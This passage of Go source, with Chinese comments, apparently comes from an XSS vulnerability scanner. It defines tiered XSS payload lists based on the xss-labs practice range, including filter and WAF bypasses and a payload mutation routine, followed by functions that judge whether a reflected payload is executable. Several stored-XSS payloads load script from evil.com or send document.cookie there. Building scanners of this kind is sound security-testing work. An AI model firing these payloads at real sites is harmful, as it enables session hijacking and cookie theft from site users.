	sinkIndex := strings.Index(jsCode, sink)
	if sinkIndex == -1 {
		return ""
	}

	// 确保source在sink之前
	if sourceIndex > sinkIndex {
		return ""
	}

	// 计算行号
	sourceLine := strings.Count(jsCode[:sourceIndex], "\n") + 1
	sinkLine := strings.Count(jsCode[:sinkIndex], "\n") + 1

	// 提取包含source和sink的行
	lines := strings.Split(jsCode, "\n")
	startLine := sourceLine - 1
	endLine := sinkLine - 1

	// 扩展上下文行
	if startLine > 3 {
		startLine -= 3
	}
	if endLine+4 < len(lines) {
		endLine += 3
	}

	// 构建详细证据
	var evidence strings.Builder
	evidence.WriteString(fmt.Sprintf("// 行 %d-%d: %s -> %s\n", sourceLine, sinkLine, source, sink))
	evidence.WriteString("// 代码片段:\n")

	for i := startLine; i <= endLine; i++ {
		lineNumber := i + 1
		line := lines[i]
		
		// 高亮source和sink
		if i+1 >= sourceLine && i+1 <= sinkLine {
			line = strings.ReplaceAll(line, source, fmt.Sprintf("[SOURCE]%s[/SOURCE]", source))
			line = strings.ReplaceAll(line, sink, fmt.Sprintf("[SINK]%s[/SINK]", sink))
		}
		
		evidence.WriteString(fmt.Sprintf("%4d: %s\n", lineNumber, line))
	}

	return evidence.String()
}

// getPayloads 获取Payload列表
func getPayloads(level string, pType PayloadType) []string {
	// 基础Payload列表 - 根据xss-labs靶场内容扩展
	basicPayloads := []string{
		// Level 1 - 简单反射
		`<script>alert('XSS')</script>`,
		`'><script>alert('XSS')</script>`,
		`<img src=x onerror=alert('XSS')>`,
		`'><img src=x onerror=alert('XSS')>`,
		`<svg onload=alert('XSS')>`,
		`"'><script>alert('XSS')</script>`,
		`'><svg onload=alert('XSS')>`,
		// Level 2 - 双引号闭合
		`"><script>alert('XSS')</script>`,
		`"><img src=x onerror=alert('XSS')>`,
		`"><svg onload=alert('XSS')>`,
	}

	// 中级Payload列表 - 包含更多标签和事件
	mediumPayloads := []string{
		// Level 3 - 单引号闭合和事件
		`'onclick='alert('XSS')`,
		`'onmouseover='alert('XSS')`,
		`'onload='alert('XSS')`,
		// Level 4 - 双引号闭合和事件
		`"onclick="alert('XSS')`,
		`"onmouseover="alert('XSS')`,
		`"onfocus="alert('XSS')" autofocus=`,
		// Level 5 - 过滤script标签
		`<a href=javascript:alert('XSS')>Click</a>`,
		`<a href=javascript:alert(document.cookie)>Click</a>`,
		// Level 6 - 过滤大小写
		`<ScRiPt>alert('XSS')</ScRiPt>`,
		`<IMG SRC=javascript:alert('XSS')>`,
		`<ImG sRc=x OnErRoR=alert('XSS')>`,
		// Level 7 - 过滤双写
		`<scrscriptipt>alert('XSS')</scrscriptipt>`,
		`<imimg onerror=alert('XSS')>`,
		`"ooonnnclickk="alert('XSS')`,
		// URL编码
		`%3Cscript%3Ealert('XSS')%3C/script%3E`,
		`&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;`,
	}

	// 高级Payload列表 - 复杂绕过和编码
	highPayloads := []string{
		// Level 8 - 过滤javascript协议
		`<a href=javasc&#x72;ipt:alert('XSS')>Click</a>`,
		`<a href=javascr&#105;pt:alert('XSS')>Click</a>`,
		`<a href=jav&#x61;script:alert('XSS')>Click</a>`,
		// Level 9 - 过滤有效URL
		`<a href=javascript:alert('XSS')//www.baidu.com>Click</a>`,
		`<a href=javascript:alert('XSS')/*http://*/>Click</a>`,
		`<a href=javascript:alert('XSS')//http://>Click</a>`,
		// Level 10 - 隐藏参数
		`"><script>alert('XSS')</script>&t_sort=1`,
		`t_sort=" type="text" onclick="alert('XSS')`,
		`t_sort=" onmouseover="alert('XSS') type=text`,
		// Level 11 - Referer头
		`Referer: " onfocus=javascript:alert() type="text`,
		`Referer: ' onfocus=javascript:alert() type='text`,
		// Level 12 - User-Agent头
		`User-Agent: " onfocus=javascript:alert() type="text`,
		`User-Agent: ' onfocus=javascript:alert() type='text`,
		// Level 13 - Cookie头
		`Cookie: " onfocus=javascript:alert() type="text`,
		`Cookie: user=" onfocus=javascript:alert() type="text`,
		// Level 14 - 图片EXIF注入
		`exiftool -Comment='"><script>alert(1)</script>' image.jpg`,
		`'><img src=image.jpg onerror=alert('XSS')>`,
		// Level 15 - AngularJS
		`{{1+1}}`,
		`{{constructor.constructor('alert("XSS")')()}}`,
		`{{$on.constructor('alert("XSS")')()}}`,
		// Level 16 - 多个关键词过滤（空字节绕过）
		`<im%00g src=x onerr%00or=alert('XSS')>`,
		`<sc%00ript>alert('XSS')</sc%00ript>`,
		`<a%00 href=java%00script:alert('XSS')>Click</a>`,
		// Level 17 - Flash XSS
		`?arg01=a&arg02=onmouseover%3dalert('XSS')`,
		`?arg01=a&arg02=onclick%3dalert('XSS')`,
		// 字符编码
		`<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>`,
		`<script>alert(unescape('%58%53%53'))</script>`,
		// 各种标签
		`<iframe src=javascript:alert('XSS')></iframe>`,
		`<object data=javascript:alert('XSS')></object>`,
		`<style>@import'javascript:alert('XSS')'</style>`,
		`<input type=image src=1 onerror=alert('XSS')>`,
		`<input type=text value='<script>alert('XSS')</script>'>`,
		`<textarea><script>alert('XSS')</script></textarea>`,
		`<button onclick=alert('XSS')>Click</button>`,
		`<select onchange=alert('XSS')><option>Test</option></select>`,
		`<input type=checkbox onchange=alert('XSS')>`,
		`<input type=radio onchange=alert('XSS')>`,
		`<body onload=alert('XSS')>`,
		`<div onresize=alert('XSS')>Test</div>`,
		`<video src=x onerror=alert('XSS')>`,
		`<audio src=x onerror=alert('XSS')>`,
		// HTML5新标签
		`<details ontoggle=alert('XSS') open>`,
		`<summary onclick=alert('XSS')>Click</summary>`,
		`<dialog open onclose=alert('XSS')>Test</dialog>`,
		`<keygen onfocus=alert('XSS') autofocus>`,
		`<marquee onstart=alert('XSS')>Test</marquee>`,
		// CSS表达式
		`<div style="background:url(javascript:alert('XSS'))">`,
		`<div style="width:expression(alert('XSS'))">`,
	}

	// WAF绕过Payload列表 - 基于xss-labs的绕过技巧
	wafBypassPayloads := []string{
		// 空格绕过
		`<script >alert('XSS')</script >`,
		`<script	>alert('XSS')</script	>`,
		`<script
>alert('XSS')</script
>`,
		`<script&#x0A;>alert('XSS')</script&#x0A;>`,
		`<script&#x0D;>alert('XSS')</script&#x0D;>`,

		// 注释绕过
		`<script><!-- alert('XSS') //--></script>`,
		`<script/**/alert('XSS')</script>`,
		`<img/src=x/onerror=alert('XSS')>`,
		`<img/src=x/**/onerror=alert('XSS')>`,
		`<a/href=javascript:alert('XSS')>Click</a>`,

		// 编码绕过
		`<script>eval(unescape('&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;'))</script>`,
		`<script>eval(decodeURIComponent('%61%6C%65%72%74%28%27%58%53%53%27%29'))</script>`,
		`<a href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;>Click</a>`,
		`<a href=%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%27%29>Click</a>`,

		// 标签混淆绕过
		`<s<script>cript>alert('XSS')</s</script>cript>`,
		`<scri<script>pt>alert('XSS')</script>`,
		`<sc<script>ript>alert('XSS')</script>`,
		`<im<img>g src=x onerror=alert('XSS')>`,

		// 事件处理程序绕过
		`<div onmouseover=alert('XSS')>Hover me</div>`,
		`<div onmousemove=alert('XSS')>Move me</div>`,
		`<div onmouseout=alert('XSS')>Move out</div>`,
		`<div onclick=alert('XSS')>Click me</div>`,
		`<div ondblclick=alert('XSS')>Double click</div>`,
		`<div oncontextmenu=alert('XSS')>Right click</div>`,
		`<button onfocus=alert('XSS') autofocus>Click me</button>`,
		`<input type=text onfocus=alert('XSS') autofocus>`,
		`<input type=text onblur=alert('XSS')>`,
		`<input type=text oninput=alert('XSS')>`,
		`<input type=text onchange=alert('XSS')>`,

		// 字符替换绕过
		`<script>alert('XSS')</script>`,
		`<script>alert('XSS');</script>`,
		`<script>alert(String.fromCharCode(88,83,83))</script>`,
		`<script>alert('XSS')</script>`,

		// 括号和引号绕过
		`<img src=x onerror=alert&#40;'XSS'&#41;>`,
		`<img src=x onerror=alert&amp;#40;'XSS'&amp;#41;>`,
		`<img src=x onerror=alert(&#x27;XSS&#x27;)>`,
		`<img src=x onerror=alert("XSS")>`,
		`<img src=x onerror=alert(XSS)>`,
		`<img src=x onerror=alert((XSS))>`,

		// 协议混淆绕过
		`<a href=java\0script:alert('XSS')>Click me</a>`,
		`<a href=java&#13;script:alert('XSS')>Click me</a>`,
		`<a href=java&#x0D;script:alert('XSS')>Click me</a>`,
		`<a href=java&#x0A;script:alert('XSS')>Click me</a>`,
		`<a href=java	script:alert('XSS')>Click me</a>`,
		`<a href=java/script:alert('XSS')>Click me</a>`,

		// 字符串拼接绕过
		`<script>alert('X'+'SS')</script>`,
		`<script>alert('X'&#43;'SS')</script>`,
		`<a href=javascript:alert('X'+'SS')>Click</a>`,

		// 特殊字符绕过
		`<script>alert(/XSS/)</script>`,
		`<script>alert(String.raw`+"`"+`XSS`+"`"+`)</script>`,
		`<script>alert(`+"`"+`XSS`+"`"+`)</script>`,

		// DOM XSS绕过
		`<script>document.write(location.hash)</script>`,
		`<script>eval(location.hash.substr(1))</script>`,
		`<script>function test(){eval(arguments[0])}test('alert("XSS")')</script>`,

		// 多重编码绕过
		`<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">`,
		`<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;">`,

		// 空字节绕过
		`<sc%00ript>alert('XSS')</sc%00ript>`,
		`<im%00g src=x on%00error=alert('XSS')>`,
		`<a%00 href=java%00script:alert('XSS')>Click</a>`,

		// Flash XSS绕过
		`?flashVar1=value1&flashVar2=onmouseover%3dalert('XSS')`,
		`?movie=swf_file.swf&param1=onclick%3dalert('XSS')`,
	}

	// 根据XSS类型添加特定Payload
	typeSpecificPayloads := []string{}
	switch pType {
	case ReflectedXSS:
		typeSpecificPayloads = append(typeSpecificPayloads,
			// 反射型XSS专用Payload
			`'><script>alert(document.location)</script>`,
			`'><script>alert(document.referrer)</script>`,
			`'><script>alert(document.cookie)</script>`,
			`?param=<script>alert('Reflected XSS')</script>`,
			`/path/<script>alert('Path XSS')</script>`,
		)
	case StoredXSS:
		typeSpecificPayloads = append(typeSpecificPayloads,
			// 存储型XSS专用Payload
			`<script>setTimeout(alert('XSS'), 1000)</script>`,
			`<script>document.createElement('script').src='http://evil.com/xss.js'</script>`,
			`<iframe src='http://evil.com/xss.html'></iframe>`,
			`<img src=x onerror="this.src='http://evil.com/log.php?c='+document.cookie">`,
			`<form action=http://evil.com/steal.php method=post><input type=hidden name=cookie value='+document.cookie+'></form>`,
		)
	case DOMXSS:
		typeSpecificPayloads = append(typeSpecificPayloads,
			// DOM型XSS专用Payload
			`<script>document.write(document.URL)</script>`,
			`<script>document.write(document.location.search)</script>`,
			`<script>document.write(document.location.hash)</script>`,
			`<script>eval(document.URL.split('?')[1])</script>`,
			`<script>eval(document.location.hash.substr(1))</script>`,
			`<script>document.getElementById('id').innerHTML=location.hash.substr(1)</script>`,
			`<script>document.write(window.name)</script>`,
		)
	}

	// 根据级别选择Payload
	var payloads []string
	switch level {
	case LowPayload:
		payloads = basicPayloads
	case MediumPayload:
		payloads = append(basicPayloads, mediumPayloads...)
	case HighPayload:
		payloads = append(append(basicPayloads, mediumPayloads...), highPayloads...)
		// 高级级别添加WAF绕过Payload
		payloads = append(payloads, wafBypassPayloads...)
		// 添加类型特定Payload
		payloads = append(payloads, typeSpecificPayloads...)
		// 对高级级别进行Payload变异
		payloads = mutatePayloads(payloads)
	default:
		payloads = append(basicPayloads, mediumPayloads...)
	}

	return payloads
}

// mutatePayloads 对Payload进行变异，生成更多变体
func mutatePayloads(payloads []string) []string {
	mutated := make([]string, 0)

	for _, payload := range payloads {
		// 添加原始Payload
		mutated = append(mutated, payload)

		// 变异1：替换引号类型
		mutated = append(mutated, strings.ReplaceAll(payload, `'`, `"`))
		mutated = append(mutated, strings.ReplaceAll(payload, `'`, ``))

		// 变异2：添加分号
		if !strings.HasSuffix(payload, `;`) {
			mutated = append(mutated, payload+`;`)
		}

		// 变异3：添加空格
		mutated = append(mutated, strings.ReplaceAll(payload, `<`, `< `))
		mutated = append(mutated, strings.ReplaceAll(payload, `>`, ` >`))

		// 变异4：使用不同的事件处理程序（针对img标签）
		if strings.Contains(payload, `<img`) {
			mutated = append(mutated, strings.ReplaceAll(payload, `onerror`, `onload`))
			mutated = append(mutated, strings.ReplaceAll(payload, `onerror`, `onmouseover`))
			mutated = append(mutated, strings.ReplaceAll(payload, `onerror`, `onclick`))
		}

		// 变异5：添加HTML注释
		if strings.Contains(payload, `<script`) {
			mutated = append(mutated, strings.ReplaceAll(payload, `<script`, `<script><!--`))
			mutated = append(mutated, strings.ReplaceAll(payload, `</script>`, `//--></script>`))
		}

		// 变异6：使用大小写混合
		mutated = append(mutated, strings.ToUpper(payload))
		mutated = append(mutated, strings.ToLower(payload))
	}

	// 去重
	unique := make(map[string]bool)
	result := make([]string, 0)

	for _, p := range mutated {
		if !unique[p] {
			unique[p] = true
			result = append(result, p)
		}
	}

	return result
}

// isPayloadReflected 检查Payload是否在响应中反射且可执行
func isPayloadReflected(response, payload string) bool {
	// 如果响应或Payload为空，直接返回false
	if response == "" || payload == "" {
		return false
	}

	// 检查响应中是否包含原始Payload
	if strings.Contains(response, payload) {
		// 检查是否存在可能的转义，导致Payload不可执行
		if isEscaped(response, payload) {
			return false
		}

		// 对于包含脚本标签的Payload，检查是否在可执行上下文中
		if strings.Contains(payload, "<script") || strings.Contains(payload, "</script>") {
			// 检查Payload是否在<script>标签内
			return isInScriptTag(response, payload)
		}

		// 对于包含事件处理程序的Payload，检查是否在HTML标签内
		if hasEventHandler(payload) {
			// 检查Payload是否在HTML标签内
			return isInHtmlTag(response, payload)
		}

		// 对于包含javascript:伪协议的Payload
		if strings.Contains(payload, "javascript:") {
			// 检查是否在href、src等属性中
			return isInExecutableAttribute(response, payload)
		}

		// 检查是否存在部分转义或编码情况
		if containsPartiallyEscapedOrEncoded(response, payload) {
			// 即使部分转义，也可能构成漏洞，需要进一步分析
			return isPotentiallyExecutable(response, payload)
		}

		// 对于其他类型的Payload，进行基本检查
		return true
	}

	// 检查HTML实体编码的Payload
	if containsHtmlEntityEncoded(response, payload) {
		return true
	}

	// 检查JavaScript转义的Payload
	if containsJavaScriptEscaped(response, payload) {
		return true
	}

	return false
}

// isEscaped 检查Payload是否被转义（导致不可执行）
func isEscaped(response, payload string) bool {
	// 检查常见的转义模式
	payloadIndex := strings.Index(response, payload)
	if payloadIndex == -1 {
		return false
	}

	// 检查<和>是否被转义
	if strings.Contains(payload, "<") && strings.Contains(response, "&lt;") && !strings.Contains(response, "<script") {
		return true
	}
	if strings.Contains(payload, ">" ) && strings.Contains(response, "&gt;") && !strings.Contains(response, "</script>") {
		return true
	}

	// 检查引号是否被转义
	if strings.Contains(payload, "'") && strings.Contains(response, "\\'") {
		return true
	}
	if strings.Contains(payload, "\"" ) && strings.Contains(response, "\\\"") {
		return true
	}

	return false
}

// containsHtmlEntityEncoded 检查响应中是否包含HTML实体编码的Payload
func containsHtmlEntityEncoded(response, payload string) bool {
	// HTML实体编码映射
	htmlEntities := map[rune]string{
		'<':  "&lt;",
		'>':  "&gt;",
		'"': "&quot;",
		'&':  "&amp;",
		'\'': "&#39;",
	}

	// 检查是否存在任何可能的HTML实体编码变体
	for _, char := range payload {
		if entity, exists := htmlEntities[char]; exists {
			if strings.Contains(response, entity) {
				// 检查这些实体是否可能构成可执行的XSS payload
				if strings.Contains(payload, "<script") && (strings.Contains(response, "&lt;script") || strings.Contains(response, "&#x3C;script")) {
					return true
				}
				if hasEventHandler(payload) && strings.Contains(response, "on") {
					return true
				}
			}
		}
	}

	// 检查十六进制和十进制实体编码
	hexChars := []string{
		"&#x3C;", "&#x3E;", "&#x27;", "&#x22;", "&#x26;",
	}
	decChars := []string{
		"&#60;", "&#62;", "&#39;", "&#34;", "&#38;",
	}

	for _, hex := range hexChars {
		if strings.Contains(response, hex) {
			return true
		}
	}
	for _, dec := range decChars {
		if strings.Contains(response, dec) {
			return true
		}
	}

	return false
}

// containsJavaScriptEscaped 检查响应中是否包含JavaScript转义的Payload
func containsJavaScriptEscaped(response, payload string) bool {
	// JavaScript转义模式检查
	jsEscapes := map[string][]string{
		"<":  {"\\\\x3C"},
		">":  {"\\\\x3E", "\\\\u003E"},
		"\"": {"\\\\x22", "\\\\u0022"},
		"'": {"\\\\x27", "\\\\u0027"},
	}

	for char, escapeList := range jsEscapes {
		if strings.Contains(payload, char) {
			for _, escape := range escapeList {
				if strings.Contains(response, escape) {
					// 检查这些转义字符是否可能构成可执行的XSS payload
					if strings.Contains(payload, "<script") && strings.Contains(response, "script") {
						return true
					}
					if hasEventHandler(payload) && strings.Contains(response, "on") {
						return true
					}
				}
			}
		}
	}

	return false
}

// containsPartiallyEscapedOrEncoded 检查是否包含部分转义或编码的Payload
func containsPartiallyEscapedOrEncoded(response, payload string) bool {
	// 检查常见的部分转义模式
	partialEscapes := []string{
		"&lt;script", "&lt;/script&gt;",
		"&#x3C;script", "&#x3C;/script&#x3E;",
		"\\x3Cscript", "\\x3C/script\\x3E",
	}

	for _, escape := range partialEscapes {
		if strings.Contains(response, escape) {
			return true
		}
	}

	return false
}

// isPotentiallyExecutable 检查部分转义的Payload是否仍然可能执行
func isPotentiallyExecutable(response, payload string) bool {
	// 检查是否存在完整的执行上下文
	if strings.Contains(payload, "<script") && strings.Contains(response, "script") &&
		(strings.Contains(response, "<script") || strings.Contains(response, "javascript")) {
		return true
	}

	if hasEventHandler(payload) && strings.Contains(response, "on") &&
		(strings.Contains(response, "=")) {
		return true
	}

	return false
}

// hasEventHandler 检查Payload是否包含事件处理程序
func hasEventHandler(payload string) bool {
	eventHandlers := []string{
		"onclick", "onload", "onerror", "onmouseover", "onmouseout",
		"onkeydown", "onkeyup", "onkeypress", "onsubmit", "onreset",
		"onfocus", "onblur", "onchange", "oncontextmenu", "onselect",
	}

	for _, event := range eventHandlers {
		if strings.Contains(payload, event) {
			return true
		}
	}

	return false
}

// isInScriptTag 检查Payload是否在<script>标签内
func isInScriptTag(response, payload string) bool {
	// 找到Payload在响应中的位置
	payloadIndex := strings.Index(response, payload)
	if payloadIndex == -1 {
		return false
	}

	// 检查Payload前面是否有<script标签
	preResponse := response[:payloadIndex]
	scriptOpenIndex := strings.LastIndex(preResponse, "<script")
	if scriptOpenIndex == -1 {
		return false
	}

	// 检查Payload前面的<script标签是否已经被关闭
	// 在<script>和Payload之间不应该有</script>
	between := preResponse[scriptOpenIndex:]
	if strings.Contains(between, "</script>") {
		return false
	}

	// 检查Payload后面是否有</script标签
	postResponse := response[payloadIndex+len(payload):]
	scriptCloseIndex := strings.Index(postResponse, "</script>")
	return scriptCloseIndex != -1
}

// isInHtmlTag 检查Payload是否在HTML标签内
func isInHtmlTag(response, payload string) bool {
	// 找到Payload在响应中的位置
	payloadIndex := strings.Index(response, payload)
	if payloadIndex == -1 {
		return false
	}

	// 检查Payload前面是否有HTML标签开始
	preResponse := response[:payloadIndex]
	tagOpenIndex := strings.LastIndex(preResponse, "<")
	if tagOpenIndex == -1 {
		return false
	}

	// 检查Payload前面的HTML标签是否已经被关闭
	// 在<标签和Payload之间不应该有>
	between := preResponse[tagOpenIndex:]
	if strings.Contains(between, ">") {
		return false
	}

	// 检查Payload后面是否有HTML标签结束或属性分隔符
	postResponse := response[payloadIndex+len(payload):]
	return strings.HasPrefix(postResponse, ">") || strings.HasPrefix(postResponse, " ") ||
		strings.HasPrefix(postResponse, "\t") || strings.HasPrefix(postResponse, "\n") ||
		strings.HasPrefix(postResponse, "'") || strings.HasPrefix(postResponse, "\"")
}

// isInExecutableAttribute 检查Payload是否在可执行属性中
func isInExecutableAttribute(response, payload string) bool {
	// 找到Payload在响应中的位置
	payloadIndex := strings.Index(response, payload)
	if payloadIndex == -1 {
		return false
	}

	// 检查Payload前面是否有等号
	preResponse := response[:payloadIndex]
	equalIndex := strings.LastIndex(preResponse, "=")
	if equalIndex == -1 {
		return false
	}

	// 检查等号前面是否有可执行属性
	// 查找等号前面最近的空格
	spaceIndex := strings.LastIndex(preResponse[:equalIndex], " ")
	if spaceIndex == -1 {
		spaceIndex = strings.LastIndex(preResponse[:equalIndex], "\t")
	}
	if spaceIndex == -1 {
		spaceIndex = strings.LastIndex(preResponse[:equalIndex], "\n")
	}

	// 提取属性名
	var attributeName string
	if spaceIndex != -1 {
		attributeName = preResponse[spaceIndex+1 : equalIndex]
	} else {
		attributeName = preResponse[:equalIndex]
	}

	// 检查是否是可执行属性
	executableAttributes := []string{
		"href", "src", "action", "onclick", "onload", "onerror",
		"onmouseover", "onmouseout", "onkeydown", "onkeyup", "onkeypress",
		"onsubmit", "onreset", "onfocus", "onblur", "onchange",
	}

	for _, attr := range executableAttributes {
		if strings.EqualFold(attributeName, attr) {
			return true
		}
	}

	return false
}

// extractEvidence 提取漏洞证据
func extractEvidence(response, payload string) string {
	// 提取包含Payload的上下文
	idx := strings.Index(response, payload)
	if idx == -1 {
		// 检查是否有编码或转义的payload
		idx = findEscapedPayload(response, payload)
		if idx == -1 {
			return ""
		}
	}

	start := idx - 50
	if start < 0 {
		start = 0
	}

	end := idx + len(payload) + 50
	if end > len(response) {
		end = len(response)
	}

	return response[start:end]
}

// identifyMainTag 识别HTML响应中的主要标签
func identifyMainTag(response string) string {
	// 查找常见的主要标签
	mainTags := []string{"div", "p", "h1", "h2", "h3", "h4", "h5", "h6", "span", "input", "textarea", "button", "a", "img"}
	
	for _, tag := range mainTags {
		// 检查是否有该标签的内容
		tagRegex := regexp.MustCompile(fmt.Sprintf(`<%s[^>]*>(.*?)</%s>`, tag, tag))
		if tagRegex.MatchString(response) {
			return fmt.Sprintf("HTML (%s Tag Content)", strings.ToUpper(tag))
		}
	}
	
	// 如果没有找到常见标签，返回默认值
	return "HTML (Content)"
}

// detectVulnerabilityLocation 检测漏洞位置类型
func detectVulnerabilityLocation(contentType, response, payload string) string {
	// 首先根据Content-Type进行初步判断
	if strings.Contains(contentType, "application/json") {
		return "JSON"
	} else if strings.Contains(contentType, "text/javascript") || strings.Contains(contentType, "application/javascript") {
		return "JavaScript"
	} else if strings.Contains(contentType, "text/css") {
		return "CSS"
	} else if strings.Contains(contentType, "text/html") || strings.Contains(contentType, "application/xhtml+xml") {
		// 如果是HTML类型，进一步判断具体位置
		idx := strings.Index(response, payload)
		payloadLen := len(payload)
		
		// 检查payload是否被转义
		if idx == -1 {
			// 检查是否有编码或转义的payload
			idx = findEscapedPayload(response, payload)
			if idx == -1 {
				// 尝试识别响应中的主要标签
				return identifyMainTag(response)
			}
			// 当payload被转义时，我们不知道确切的长度，所以估算一个合理的长度
			payloadLen = 20 // 一个合理的估计值
		}
		
		// 查找payload所在的HTML标签
		beforeContext := response[:idx]
		
		// 检查是否在脚本标签中
		if isInScriptTag(response, payload) {
			return "HTML (Script Tag)"
		}
		
		// 检查是否在HTML标签的可执行属性中
		if isInExecutableAttribute(response, payload) {
			// 查找具体的标签名和属性名
			// 1. 查找最近的标签
			tagRegex := regexp.MustCompile(`<([a-zA-Z][a-zA-Z0-9]*)(?:\s+[^>]*)?$`)
			tagMatch := tagRegex.FindStringSubmatch(beforeContext)
			
			if len(tagMatch) > 1 {
				tagName := tagMatch[1]
				
				// 2. 查找具体的属性
				tagContent := tagMatch[0]
				attrRegex := regexp.MustCompile(`\s+([a-zA-Z][a-zA-Z0-9-]*)(?:\s*=\s*["'][^"']*["'])?`)
				attrMatches := attrRegex.FindAllStringSubmatch(tagContent, -1)
				
				if len(attrMatches) > 0 {
					// 获取所有属性名
					var attrNames []string
					for _, match := range attrMatches {
						if len(match) > 1 {
							attrNames = append(attrNames, match[1])
						}
					}
					
					if len(attrNames) > 0 {
						lastAttr := attrNames[len(attrNames)-1]
						return fmt.Sprintf("HTML (%s Tag, %s Attribute)", strings.ToUpper(tagName), strings.Title(lastAttr))
					}
				}
				
				return fmt.Sprintf("HTML (%s Tag, Executable Attribute)", strings.ToUpper(tagName))
			}
			
			return "HTML (Executable Attribute)"
		}
		
		// 查找最近的标签
		tagRegex := regexp.MustCompile(`<([a-zA-Z][a-zA-Z0-9]*)(?:\s+[^>]*)?$`)
		tagMatch := tagRegex.FindStringSubmatch(beforeContext)
		
		if len(tagMatch) > 1 {
			tagName := tagMatch[1]
			
			// 检查是否在属性中
			if strings.Contains(tagMatch[0], "=") {
				// 查找具体的属性名
				tagContent := tagMatch[0]
				attrRegex := regexp.MustCompile(`\s+([a-zA-Z][a-zA-Z0-9-]*)(?:\s*=\s*["'][^"']*["'])?`)
				attrMatches := attrRegex.FindAllStringSubmatch(tagContent, -1)
				
				if len(attrMatches) > 0 {
					lastAttr := attrMatches[len(attrMatches)-1][1]
					return fmt.Sprintf("HTML (%s Tag, %s Attribute)", strings.ToUpper(tagName), strings.Title(lastAttr))
				}
				
				return fmt.Sprintf("HTML (%s Tag, Attribute)", strings.ToUpper(tagName))
			}
			
			return fmt.Sprintf("HTML (%s Tag Content)", strings.ToUpper(tagName))
		}
		
		// 检查是否在HTML标签之间
		if isInHtmlTag(response, payload) {
			return "HTML (Tag Content)"
		}
		
		// 尝试识别具体的父标签，即使不在标签属性中
		startTagRegex := regexp.MustCompile(`<([a-zA-Z][a-zA-Z0-9]*)(?:\s+[^>]*)?>`)
		matches := startTagRegex.FindAllStringSubmatch(response[:idx], -1)
		
		if len(matches) > 0 {
			// 取最后一个匹配的标签
			lastTag := matches[len(matches)-1][1]
			
			// 检查是否有对应的结束标签
			endTagRegex := regexp.MustCompile(fmt.Sprintf(`</%s>`, lastTag))
			endTagMatch := endTagRegex.FindStringIndex(response[idx+payloadLen:])
			
			if endTagMatch != nil {
				return fmt.Sprintf("HTML (%s Tag Content)", strings.ToUpper(lastTag))
			}
		}
		
		return "HTML (Content)"
	}
	
	// 默认返回Unknown
	return "Unknown"
}

// findEscapedPayload 在响应中查找可能被转义或编码的payload
func findEscapedPayload(response, payload string) int {
	// 检查payload是否包含特殊字符，这些字符在HTML中可能被转义
	specialChars := []struct{ original, escaped string }{ 
		{"<", "&lt;"}, 
		{">", "&gt;"}, 
		{"'", "&#x27;"}, 
		{"\"", "&quot;"}, 
		{"&", "&amp;"},
		{"<", "&#x3c;"},
		{">", "&#x3e;"},
		{"<", "&#60;"},
		{">", "&#62;"},
	}
	
	// 检查每种特殊字符的转义版本
	for _, charPair := range specialChars {
		// 替换payload中的特殊字符为转义版本
		escapedPayload := strings.ReplaceAll(payload, charPair.original, charPair.escaped)
		if idx := strings.Index(response, escapedPayload); idx != -1 {
			return idx
		}
	}
	
	// 检查URL编码版本
	urlEncodedPayload := url.QueryEscape(payload)
	if idx := strings.Index(response, urlEncodedPayload); idx != -1 {
		return idx
	}
	
	// 检查部分URL编码版本
	for i := 0; i < len(payload); i++ {
		// 对payload的每个字符进行URL编码
		partialEncoded := payload[:i] + "%" + fmt.Sprintf("%02X", payload[i]) + payload[i+1:]
		if idx := strings.Index(response, partialEncoded); idx != -1 {
			return idx
		}
	}
	
	// 检查常见的HTML实体编码变体
	hexVariants := []string{"&#x", "%3C", "%3E", "%27", "%22", "%26"}
	for _, variant := range hexVariants {
		if idx := strings.Index(response, variant); idx != -1 {
			return idx
		}
	}

	// 检查JavaScript转义变体
	jsVariants := []string{`\x`, `\u00`, `\'`, `\"`}
	for _, variant := range jsVariants {
		if idx := strings.Index(response, variant); idx != -1 {
			return idx
		}
	}

	return -1
}

// checkEscapeBypass 检查是否存在转义绕过技术
func checkEscapeBypass(response, payload string) bool {
	// 检查空字节绕过
	if strings.Contains(response, "\x00") || strings.Contains(response, "%00") {
		return true
	}

	// 检查多重重编码绕过
	if strings.Contains(response, "&amp;lt;") || strings.Contains(response, "&amp;gt;") {
		return true
	}

	// 检查大小写混合绕过
	escapedPatterns := []struct {
		original string
		mixed    []string
	}{
		{"<script", []string{"<ScRiPt", "<SCRIPT", "<script"}},
		{"onerror", []string{"OnErRoR", "ONERROR", "onError"}},
		{"javascript:", []string{"JaVaScRiPt:", "JAVASCRIPT:", "javaScript:"}},
	}

	for _, pattern := range escapedPatterns {
		for _, mixed := range pattern.mixed {
			if strings.Contains(response, mixed) {
				return true
			}
		}
	}

	// 检查HTML注释绕过
	if strings.Contains(response, "<!--") && strings.Contains(response, "-->") &&
		(strings.Contains(response, "script") || hasEventHandler(payload)) {
		return true
	}

	return false
}

// isFalsePositive 检测是否为误报
func isFalsePositive(response, payload string, contentType string) bool {
	// 检查是否在注释中
	if isInHtmlComment(response, payload) {
		return true
	}

	// 检查是否在CDATA块中
	if isInCDATA(response, payload) {
		return true
	}

	// 检查Content-Type是否为纯文本或JSON（通常不会执行HTML/JS）
	if strings.Contains(contentType, "text/plain") || strings.Contains(contentType, "application/json") {
		return true
	}

	// 检查是否在不可执行的上下文中
	if isInNonExecutableContext(response, payload) {
		return true
	}

	// 检查是否为无效的HTML/JS语法（即使反射也无法执行）
	if hasInvalidSyntax(payload) {
		return true
	}

	// 检查是否在srcdoc、data等属性中但被正确转义
	if isInEscapedAttribute(response, payload) {
		return true
	}

	return false
}

// isInHtmlComment 检查是否在HTML注释中
func isInHtmlComment(response, payload string) bool {
	payloadIndex := strings.Index(response, payload)
	if payloadIndex == -1 {
		return false
	}

	// 检查前面是否有注释开始标记
	preResponse := response[:payloadIndex]
